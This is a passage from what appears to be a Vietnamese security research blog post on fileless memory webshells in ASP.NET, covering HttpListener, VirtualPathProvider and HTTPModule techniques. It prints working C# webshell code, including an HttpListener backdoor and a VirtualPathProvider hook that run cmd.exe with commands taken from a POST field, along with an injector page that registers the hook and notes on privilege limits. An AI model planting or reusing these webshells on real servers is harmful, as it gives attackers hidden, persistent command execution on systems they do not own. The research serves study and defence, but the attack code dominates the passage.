</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>public</span> <span class=k>static</span> <span class=n>void</span> <span class=n>CustomListener</span><span class=p>(</span><span class=n>string</span> <span class=n>url</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>HttpListener</span> <span class=n>listener</span> <span class=o>=</span> <span class=n>new</span> <span class=n>HttpListener</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>listener</span><span class=o>.</span><span class=n>Prefixes</span><span class=o>.</span><span class=n>Add</span><span class=p>(</span><span class=n>url</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>listener</span><span class=o>.</span><span class=n>Start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>listener</span><span class=o>.</span><span class=n>IsListening</span><span class=p>){</span>
</span></span><span class=line><span class=cl>       <span class=n>HttpListenerContext</span> <span class=n>context</span> <span class=o>=</span> <span class=n>listener</span><span class=o>.</span><span class=n>GetContext</span><span class=p>();</span>
</span></span><span class=line><span class=cl>       <span class=n>HttpListenerRequest</span> <span class=n>request</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=n>HttpListenerResponse</span> <span class=n>response</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>Response</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=n>Stream</span> <span class=n>stm</span> <span class=o>=</span> <span class=n>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=n>try</span><span class=p>{</span> 
</span></span><span class=line><span class=cl>          <span class=n>string</span> <span class=n>data</span> <span class=o>=</span> <span class=n>new</span> <span class=n>StreamReader</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>InputStream</span><span class=p>,</span> <span class=n>request</span><span class=o>.</span><span class=n>ContentEncoding</span><span class=p>)</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>();</span>
</span></span><span class=line><span class=cl>          <span class=n>byte</span><span class=p>[]</span> <span class=n>rawData</span> <span class=o>=</span> <span class=n>Encoding</span><span class=o>.</span><span class=n>Default</span><span class=o>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>data</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>          <span class=n>HttpRequest</span> <span class=n>req</span> <span class=o>=</span> <span class=n>new</span> <span class=n>HttpRequest</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=n>request</span><span class=o>.</span><span class=n>Url</span><span class=o>.</span><span class=n>ToString</span><span class=p>(),</span> <span class=n>request</span><span class=o>.</span><span class=n>QueryString</span><span class=o>.</span><span class=n>ToString</span><span class=p>());</span>
</span></span><span class=line><span class=cl>          <span class=n>FieldInfo</span> <span class=n>field</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>GetType</span><span class=p>()</span><span class=o>.</span><span class=n>GetField</span><span class=p>(</span><span class=s2>&#34;_form&#34;</span><span class=p>,</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>Type</span> <span class=n>formtype</span> <span class=o>=</span> <span class=n>field</span><span class=o>.</span><span class=n>FieldType</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>MethodInfo</span> <span class=n>method</span> <span class=o>=</span> <span class=n>formtype</span><span class=o>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s2>&#34;FillFromEncodedBytes&#34;</span><span class=p>,</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>ConstructorInfo</span> <span class=n>constructor</span> <span class=o>=</span> <span class=n>formtype</span><span class=o>.</span><span class=n>GetConstructor</span><span class=p>(</span><span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span><span class=p>,</span> <span class=n>null</span><span class=p>,</span> <span class=n>new</span> <span class=n>Type</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>object</span> <span class=n>obj</span> <span class=o>=</span> <span class=n>constructor</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>method</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>rawData</span><span class=p>,</span> <span class=n>request</span><span class=o>.</span><span class=n>ContentEncoding</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>          <span class=n>field</span><span class=o>.</span><span class=n>SetValue</span><span class=p>(</span><span class=n>req</span><span class=p>,</span> <span class=n>obj</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>          <span class=ne>String</span> <span class=n>cmd</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>Form</span><span class=p>[</span><span class=s2>&#34;command&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=n>cmd</span> <span class=o>!=</span> <span class=n>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>             <span class=k>if</span> <span class=p>(</span><span class=n>cmd</span> <span class=o>==</span> <span class=s2>&#34;exit&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>listener</span><span class=o>.</span><span class=n>Stop</span><span class=p>();</span>
</span></span><span class=line><span class=cl>             <span class=p>}</span>
</span></span><span class=line><span class=cl>             <span class=n>Process</span> <span class=n>p</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Process</span><span class=p>();</span>
</span></span><span class=line><span class=cl>             <span class=n>p</span><span class=o>.</span><span class=n>StartInfo</span><span class=o>.</span><span class=n>FileName</span> <span class=o>=</span> <span class=s2>&#34;cmd.exe&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>             <span class=n>p</span><span class=o>.</span><span class=n>StartInfo</span><span class=o>.</span><span class=n>Arguments</span> <span class=o>=</span> <span class=s2>&#34;/c&#34;</span> <span class=o>+</span> <span class=n>cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>             <span class=n>p</span><span class=o>.</span><span class=n>Start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>             <span class=n>byte</span><span class=p>[]</span> <span class=n>output</span> <span class=o>=</span> <span class=n>Encoding</span><span class=o>.</span><span class=n>UTF8</span><span class=o>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>StandardOutput</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>()</span> <span class=o>+</span> <span class=n>p</span><span class=o>.</span><span class=n>StandardError</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>());</span>
</span></span><span class=line><span class=cl>             <span class=n>response</span><span class=o>.</span><span class=n>StatusCode</span> <span class=o>=</span> <span class=mi>200</span><span class=p>;</span>
</span></span><span class=line><span class=cl>             <span class=n>response</span><span class=o>.</span><span class=n>ContentLength64</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>Length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>             <span class=n>stm</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>OutputStream</span><span class=p>;</span>
</span></span><span class=line><span class=cl>             <span class=n>stm</span><span class=o>.</span><span class=n>Write</span><span class=p>(</span><span class=n>output</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>output</span><span class=o>.</span><span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>       <span class=p>}</span>
</span></span><span class=line><span class=cl>       <span class=n>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>e</span><span class=p>){</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>CustomListener</span><span class=p>(</span><span class=s2>&#34;http://localhost:5000/memshell/&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Ngon luÃ´n:<br><img src=https://hackmd.io/_uploads/HyK17KoBWl.png loading=lazy alt=image></p><h3 id=giá»›i-háº¡n>Giá»›i Háº¡n</h3><p>CÃ¢u há»i Ä‘áº·t ra lÃ , mÃ¬nh cÃ³ Ä‘á» cáº­p Ä‘áº¿n viá»‡c ká»¹ thuáº­t cáº§n quyá»n System nhÆ°ng táº¡i Ä‘Ã¢y ngÆ°á»i dÃ¹ng thÃ´ng thÆ°á»ng váº«n cÃ³ thá»ƒ triá»ƒn khai Ä‘Æ°á»£c HttpListener Memory Webshell?<br>Äá»ƒ cháº¡y má»™t HttpListerner báº¯t buá»™c pháº£i thÃªm Ä‘Æ°á»ng dáº«n Ä‘áº¿n HTTP Server thÃ´ng qua dÃ²ng lá»‡nh: HttpListener.Prefixes.Add, method nÃ y thá»±c cháº¥t gá»i Ä‘áº¿n HttpListener.AddPrefix, nÆ¡i sáº½ tiáº¿p tá»¥c gá»i Ä‘áº¿n HttpListener.InternalAddPrefix vÃ  cuá»‘i cÃ¹ng lÃ  HttpAddUrlToUrlGroup. ÄÃ¢y lÃ  method Ä‘Æ°á»£c import tá»« native dll httpapi.dll:<br><img src=https://hackmd.io/_uploads/SJoo-Forbl.png loading=lazy alt=image><br>Vá» chá»©c nÄƒng, thÃ´ng tin cÅ©ng nhÆ° lÆ°u Ã½ cá»§a hÃ m nÃ y, Microsoft Ä‘Ã£ thÃ´ng bÃ¡o rÃµ ráº±ng tham sá»‘ pFullyQualifiedUrl chá»©a url truyá»n vÃ o náº¿u nhÆ° cÃ³ cá»•ng dá»‹ch vá»¥ nhá» hÆ¡n 1024 cáº§n quyá»n System Ä‘á»ƒ thá»±c thi, náº¿u khÃ´ng sáº½ dÃ­nh lá»—i Access Denied:<br><img src=https://hackmd.io/_uploads/rkN5mYoBWg.png loading=lazy alt=image><br>Tá»©c lÃ  trong trÆ°á»ng há»£p ngÆ°á»i dÃ¹ng web khÃ´ng cÃ³ quyá»n System, khÃ´ng thá»ƒ táº¡o Ä‘Æ°á»£c HTTP Server thÃ´ng qua HttpListener mÃ  cá»•ng dá»‹ch vá»¥ nhá» hÆ¡n 1024.<br>NgoÃ i viá»‡c sá»­ dá»¥ng port tháº¥p ra, náº¿u nhÆ° muá»‘n khá»Ÿi táº¡o Server vá»›i IP khÃ´ng pháº£i localhost/127.0.0.1 mÃ  lÃ  IP cá»§a card máº¡ng wifi hoáº·c ethernet cÅ©ng cáº§n quyá»n System: Ä‘Ã¢y chÃ­nh lÃ  Ä‘iá»ƒm yáº¿u vÃ¬ trong mÃ´i trÆ°á»ng táº¥n cÃ´ng viá»‡c má»Ÿ server báº±ng IP local lÃ  vÃ´ nghÄ©a. VÃ­ dá»¥ nhÆ° á»Ÿ Ä‘Ã¢y Ä‘á»‹a chá»‰ IP card wifi cá»§a mÃ¬nh lÃ  192.168.100.198:<br><img src=https://hackmd.io/_uploads/Hy8ZNForWl.png loading=lazy alt=image><br>Náº¿u nhÆ° khá»Ÿi táº¡o HttpListener lÃ  http://192.168.100.198:5000/memshell/ sáº½ dÃ­nh lá»—i khÃ´ng cÃ³ quyá»n, do ngÆ°á»i dÃ¹ng deploy web Ä‘ang lÃ  user thÆ°á»ng:<br><img src=https://hackmd.io/_uploads/r1XmEtjS-x.png loading=lazy alt=image><br>NgoÃ i ra, sá»­ dá»¥ng wildcard IP hoáº·c wildcard hostname nhÆ°: <code>http://*:8080/</code>, <code>http://+:8080/</code> cÅ©ng yÃªu cáº§u quyá»n System Ä‘á»ƒ thá»±c thi.</p><h2 id=virtualpath-memory-webshell>VirtualPath Memory Webshell</h2><p>ÄÃ¢y lÃ  ká»¹ thuáº­t Ä‘Æ°á»£c sá»­ dá»¥ng phá»• biáº¿n nháº¥t khi explot .NET Memory Webshell, Ä‘Æ°á»£c sá»­ dá»¥ng lÃ m method táº¡o memshell trÃªn Godzilla: <a class=link href=https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs target=_blank rel=noopener>https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs</a><br>Äá»ƒ vÃ­ dá»¥ VirtualPathProvider trá»±c quan hÆ¡n thÃ¬ mÃ¬nh cÃ³ cÃ¡ch diá»…n giáº£i nhÆ° sau: ThÃ´ng thÆ°á»ng Ä‘á»ƒ truy cáº­p file aspx thÃ¬ trÃªn há»‡ thá»‘ng buá»™c pháº£i tá»“n táº¡i file tÆ°Æ¡ng á»©ng trong thÆ° má»¥c web váº­t lÃ½, cÃ²n VirtualPathProvider giÃºp lÆ°u trá»¯ file File.aspx á»Ÿ báº¥t cá»© Ä‘Ã¢u chá»© khÃ´ng nháº¥t thiáº¿t pháº£i tá»“n táº¡i trong há»‡ thá»‘ng file váº­t lÃ½ táº¡i server, cÃ³ thá»ƒ lÃ  lÆ°u trong database,&mldr;<br><img src=https://hackmd.io/_uploads/S1Y4CYoS-g.png loading=lazy alt=image></p><h3 id=not-so-memshell>Not so memshell</h3><p>Tá»« khÃºc nÃ y mÃ¬nh sáº½ viáº¿t táº¯t VirtualPathProvider = VPP.<br>Method RegisterVirtualPathProviderInternal chá»‹u trÃ¡ch nhiá»‡m thÃªm VPP má»›i vÃ o há»‡ thá»‘ng báº±ng cÃ¡ch lÆ°u Ä‘Æ°á»ng dáº«n áº£o truyá»n vÃ o <code>_virtualPathProvider</code>, vÃ  Ä‘Æ°a VPP Ä‘Æ°á»£c Ä‘Äƒng kÃ½ trÆ°á»›c Ä‘Ã³ vÃ o method Initialize. NÆ¡i mÃ  VPP Ä‘Ã£ tá»“n táº¡i Ä‘Æ°á»£c Ä‘Æ°a vÃ o <code>_previous</code>:<br><img src=https://hackmd.io/_uploads/ByIw-6jB-x.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/BkIc-TjBZe.png loading=lazy alt=image><br>Tá»©c khi má»™t VPP má»›i Ä‘Æ°á»£c thÃªm vÃ o, VPP Ä‘Ã£ thÃªm trÆ°á»›c Ä‘Ã³ Ä‘Æ°á»£c coi nhÆ° má»™t node trÆ°á»›c vÃ  cÃ³ thá»ƒ truy cáº­p thÃ´ng qua thuá»™c tÃ­nh Previous.<br>Khi má»™t request web page Ä‘áº¿n, á»©ng dá»¥ng xÃ©t láº§n lÆ°á»£t tá»« VirtualPath má»›i nháº¥t Ä‘áº¿n cÅ© nháº¥t cho Ä‘áº¿n khi trÃ¹ng khá»›p hoáº·c thuá»™c tÃ­nh previous lÃ  null thÃ¬ dá»«ng láº¡i. VÃ  <code>_virtualPathProvider</code> tá»“n táº¡i Ä‘á»ƒ chá»©a giÃ¡ trá»‹ cá»§a node má»›i nháº¥t Ä‘Æ°á»£c thÃªm vÃ o. CÃ¡ch tá»• chá»©c vÃ  duyá»‡t pháº§n tá»­ nhÆ° nÃ y khÃ¡ giá»‘ng vá»›i má»™t danh sÃ¡ch liÃªn káº¿t Ä‘Æ¡n cÃ³ 1 con trá» head.
MÃ¬nh cÃ³ thá»ƒ Ä‘Äƒng kÃ½ 1 VPP vá»›i ná»™i dung tÃ¹y chá»‰nh báº±ng Ä‘oáº¡n mÃ£ sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%
</span></span><span class=line><span class=cl>string base64 = &#34;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpTY3JpcHQiICU+DQo8JSBSZXNwb25zZS5Xcml0ZSgiVmlydHVhbFBhdGggQ3JlYXRlZCBTdWNjZXNzZnVsbHkiKTsgJT4=&#34;;
</span></span><span class=line><span class=cl>string content = Encoding.UTF8.GetString(System.Convert.FromBase64String(base64));
</span></span><span class=line><span class=cl>string targetVirtualPath = &#34;/TestPath.aspx&#34;;
</span></span><span class=line><span class=cl>try{
</span></span><span class=line><span class=cl>    TestPathProvider testProvider = new TestPathProvider(targetVirtualPath, content);
</span></span><span class=line><span class=cl>    HostingEnvironment.RegisterVirtualPathProvider(testProvider);
</span></span><span class=line><span class=cl>    testProvider.InitializeLifetimeService();
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>catch (Exception error){
</span></span><span class=line><span class=cl>    Console.WriteLine(error);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>%&gt;
</span></span></code></pre></td></tr></table></div></div><p>Trigger file nÃ y sáº½ táº¡o 1 VPP vá»›i Ä‘Æ°á»ng dáº«n <code>/TestPath.aspx</code>, cÅ©ng cÃ³ thá»ƒ coi lÃ  má»™t fileless webshell:<br><img src=https://hackmd.io/_uploads/r1-IMTorWl.png loading=lazy alt=image><br>Äá»ƒ trá»Ÿ thÃ nh má»™t ká»¹ thuáº­t memshell Ä‘Ãºng nghÄ©a, mÃ¬nh muá»‘n exec command táº¡i Ä‘Æ°á»ng dáº«n báº¥t ká»³, cho nÃªn Ä‘oáº¡n code nÃ y lÃ  chÆ°a Ä‘á»§ Ä‘á»ƒ Ä‘Ã¡p á»©ng Ä‘iá»u kiá»‡n.</p><h3 id=virtualpath-at-its-finest>VirtualPath at its finest</h3><p>Trong lÃºc debug thÃ¬ mÃ¬nh tháº¥y cÃ³ 2 method luÃ´n Ä‘Æ°á»£c gá»i khi truy cáº­p báº¥t ká»³ path nÃ o, Ä‘Ã³ lÃ  GetCacheKey vÃ  FileExists. NhÆ°ng khi ngÃ³ Ä‘oáº¡n code gen memshell cá»§a Godzilla, mÃ¬nh tháº¥y code memshell Ä‘Æ°á»£c truyá»n vÃ o method GetCacheKey. Äá»ƒ kiá»ƒm tra xem method nÃ o Ä‘Æ°á»£c call trÆ°á»›c, mÃ¬nh kiá»ƒm tra vá»›i 1 script Ä‘Æ¡n giáº£n:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class TestPathProvider : VirtualPathProvider{
</span></span><span class=line><span class=cl>    public override string GetCacheKey(string virtualPath){
</span></span><span class=line><span class=cl>        Console.WriteLine(&#34;GetCacheKey called!!!&#34;);
</span></span><span class=line><span class=cl>        return Previous.GetCacheKey(virtualPath);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    public override bool FileExists(string virtualPath){
</span></span><span class=line><span class=cl>        Console.WriteLine(&#34;FileExists called!!!&#34;);
</span></span><span class=line><span class=cl>        return Previous.FileExists(virtualPath);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>GetCacheKey Ä‘Æ°á»£c gá»i trÆ°á»›c, hiá»ƒu vÃ¬ sao nÃ³ Ä‘Æ°á»£c dÃ¹ng rá»“i ha ğŸ˜Š<br><img src=https://hackmd.io/_uploads/Skb3XpoHZg.png loading=lazy alt=image><br>MÃ¬nh craft láº¡i thÃ nh code gen VirtualPath memshell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script runat=&#34;server&#34;&gt;
</span></span><span class=line><span class=cl>    public class TestPathProvider : VirtualPathProvider{
</span></span><span class=line><span class=cl>        public override string GetCacheKey(string virtualPath){
</span></span><span class=line><span class=cl>            HttpContext context = HttpContext.Current;
</span></span><span class=line><span class=cl>            String cmd = context.Request.Form[&#34;command&#34;];
</span></span><span class=line><span class=cl>            if (cmd != null){
</span></span><span class=line><span class=cl>                HttpResponse response = context.Response;
</span></span><span class=line><span class=cl>                Process p = new Process();
</span></span><span class=line><span class=cl>                p.StartInfo.FileName = &#34;cmd.exe&#34;;
</span></span><span class=line><span class=cl>                p.StartInfo.Arguments = &#34;/c&#34; + cmd;
</span></span><span class=line><span class=cl>                p.Start();
</span></span><span class=line><span class=cl>                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());                     
</span></span><span class=line><span class=cl>                response.Write(System.Text.Encoding.Default.GetString(data));
</span></span><span class=line><span class=cl>                response.End();
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>            return Previous.GetCacheKey(virtualPath);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>&lt;/script&gt;
</span></span><span class=line><span class=cl>&lt;%
</span></span><span class=line><span class=cl>    TestPathProvider testProvider = new TestPathProvider();
</span></span><span class=line><span class=cl>    HostingEnvironment.RegisterVirtualPathProvider(testProvider);
</span></span><span class=line><span class=cl>    testProvider.InitializeLifetimeService();
</span></span><span class=line><span class=cl>    Response.Write(&#34;VirtualPath Memory Webshell injected!!!&#34;);
</span></span><span class=line><span class=cl>    Response.End();
</span></span><span class=line><span class=cl>%&gt;
</span></span></code></pre></td></tr></table></div></div><p>Now we got the real memshell here:<br><img src=https://hackmd.io/_uploads/rkFcVairWl.png loading=lazy alt=image><br></p><h2 id=httpmodule-memory-webshell>HTTPModule Memory Webshell</h2><p>Äáº¿n vá»›i ká»¹ thuáº­t gáº§n Ä‘Ã¢y vÃ  phá»©c táº¡p nháº¥t, Ä‘Æ°á»£c team researcher cá»§a VCS cÃ´ng bá»‘ táº¡i buá»•i SecTalk vÃ o thÃ¡ng 5 nÄƒm 2025 khi tiáº¿n hÃ nh RedTeam vÃ o há»‡ thá»‘ng cÃ³ sá»­ dá»¥ng Microsoft Exchange.<br>Ã tÆ°á»Ÿng cá»§a ká»¹ thuáº­t nÃ y Ä‘Ã£ Ä‘Æ°á»£c Ä‘á» cáº­p trong paper cá»§a CrowdStrike vá» framework <a class=link href=https://www.crowdstrike.com/wp-content/uploads/2022/05/crowdstrike-iceapple-a-novel-internet-information-services-post-exploitation-framework-1.pdf target=_blank rel=noopener>IceApple</a> táº¡i module 18, vá»›i má»¥c Ä‘Ã­ch thÃªm má»™t EventHandler vÃ o trong cÃ¡c HttpApplication Ä‘ang Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi server:<br><img src=https://hackmd.io/_uploads/r1yOHToB-e.png loading=lazy alt=image><br></p><h3 id=httpapplication-reuse-mechanism>HttpApplication Reuse Mechanism</h3><p>Táº¡i pháº§n request life cycle, mÃ¬nh Ä‘Ã£ nÃ³i vá» viá»‡c má»™t HttpApplication instance Ä‘Æ°á»£c khá»Ÿi táº¡o, á»Ÿ Ä‘Ã¢y mÃ¬nh sáº½ giáº£i thÃ­ch chi tiáº¿t hÆ¡n viá»‡c nÃ³ Ä‘Æ°á»£c khá»Ÿi táº¡o nhÆ° tháº¿ nÃ o:<br>Khi HTTP request Ä‘áº¿n server, nhá»¯ng hÃ m tiá»n xá»­ lÃ½ Ä‘Æ°á»£c gá»i Ä‘á»ƒ khá»Ÿi táº¡o HttpContext vÃ  cÃ¡c thÃ´ng tin cáº§n thiáº¿t. Äiá»u nÃ y Ä‘Æ°á»£c thá»±c hiá»‡n thÃ´ng qua 3 hÃ m ProcessRequestNotification trong callstack dÆ°á»›i Ä‘Ã¢y:<br><img src=https://hackmd.io/_uploads/HJMiBpsHZx.png loading=lazy alt=image><br>Sau Ä‘Ã³, HttpApplicationFactory tiáº¿n hÃ nh láº¥y ra 1 instance cá»§a HttpApplication Ä‘á»ƒ handle HttpContext, viá»‡c lá»±a chá»n vÃ  láº¥y ra nhÆ° tháº¿ nÃ o náº±m táº¡i hÃ m GetNormalApplicationInstance:<br><img src=https://hackmd.io/_uploads/H1psHTiH-x.png loading=lazy alt=image><br>Táº¡i hÃ m GetNormalApplicationInstance, HttpApllicationFactory sá»­ dá»¥ng attribute <code>_freeList</code> chá»©a cÃ¡c object HttpApllication Ä‘Ã£ xá»­ lÃ½ xong request vÃ  Ä‘Æ°á»£c tÃ¡i cháº¿ Ä‘á»ƒ sá»­ dá»¥ng láº¡i. Náº¿u láº¥y Ä‘Æ°á»£c sáº½ tráº£ vá» object httpApplication Ä‘Ã³:<br><img src=https://hackmd.io/_uploads/ByH0BTorbl.png loading=lazy alt=image><br>Tá»« Ä‘Ã¢y rÃºt ra Ä‘Æ°á»£c má»™t sá»‘ káº¿t luáº­n vá» HttpApplication nhÆ° sau:</p><ul><li>Má»—i HttpApplication instance Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ xá»­ lÃ½ 1 request, vÃ  khÃ´ng thá»ƒ bá»‹ can thiá»‡p cho Ä‘áº¿n khi xá»­ lÃ½ xong</li><li>Náº¿u nhÆ° sá»‘ lÆ°á»£ng request gá»­i Ä‘áº¿n nhiá»u hÆ¡n sá»‘ lÆ°á»£ng instance HttpApplication cÃ³ trong <code>_freeList</code>, viá»‡c táº¡o má»›i Ä‘á»ƒ thá»±c thi ngay hay sá»­ dá»¥ng láº¡i tÃ¹y thuá»™c vÃ o cÆ¡ cháº¿ Ä‘á»“ng bá»™</li><li>Náº¿u nhÆ° sá»­ dá»¥ng .NET Framework lá»›n hÆ¡n 4.5 thÃ¬ máº·c Ä‘á»‹nh cÆ¡ cháº¿ nÃ y Ä‘Æ°á»£c báº­t.</li></ul><h3 id=logic-add-eventhandler-into-httpmodule>Logic Add EventHandler into HttpModule</h3><p>Tiáº¿p tá»¥c tá»« hÃ m trÆ°á»›c, lÃºc nÃ y HttpModule Ä‘Æ°á»£c khá»Ÿi táº¡o thÃ´ng qua hÃ m hÃ m Init, vÃ  call Ä‘áº¿n cÃ¡c event handler cÃ³ trong module Ä‘Ã³, Ä‘Ã¢y cÅ©ng chÃ­nh lÃ  nhá»¯ng gÃ¬ xáº£y ra trong HTTP Pipeline Ä‘Ã£ trÃ¬nh bÃ y á»Ÿ trÃªn. Event AuthenticateRequest Ä‘á»©ng ngay sau event Ä‘áº§u tiÃªn BeginRequest - má»™t event dÃ¹ng Ä‘á»ƒ init thuá»™c tÃ­nh nÃªn cÃ³ thá»ƒ coi Ä‘Ã¢y lÃ  event sá»›m nháº¥t Ä‘Æ°á»£c gá»i.<br>Khi Ä‘Æ°á»£c gá»i, AuthenticateRequest ngay láº­p tá»©c gá»i phÆ°Æ¡ng thá»©c add Ä‘á»ƒ thÃªm má»™t object thuá»™c class EventHandler vÃ o HttpModule:<br><img src=https://hackmd.io/_uploads/HJK1vTiHZl.png loading=lazy alt=image><br>HÃ m AddSyncEventHookup nÃ y thá»±c cháº¥t Ä‘Æ°á»£c thá»±c hiá»‡n vá»›i tham sá»‘ isPostNotification lÃ  false:<br><img src=https://hackmd.io/_uploads/SJleDajBWl.png loading=lazy alt=image><br>Má»™t HttpApplication cÃ³ nhiá»u HttpModule, lÆ°u trong attribute ModuleContainers - 1 máº£ng cÃ¡c pháº§n tá»­ lÃ  instance cá»§a class PipelineModuleStepContainer.<br>Äá»ƒ thÃªm Ä‘Æ°á»£c Event vÃ o Ä‘Ãºng module, trÆ°á»›c háº¿t cáº§n pháº£i láº¥y module Ä‘Ã³ ra tá»« ModuleContainers thÃ´ng qua hÃ m GetModuleContainer. EventHandler Ä‘Æ°á»£c Ã©p thÃ nh SyncEventExecutionStep rá»“i má»›i thá»±c hiá»‡n thÃªm event Ä‘Ã³ táº¡i method AddEvent:<br><img 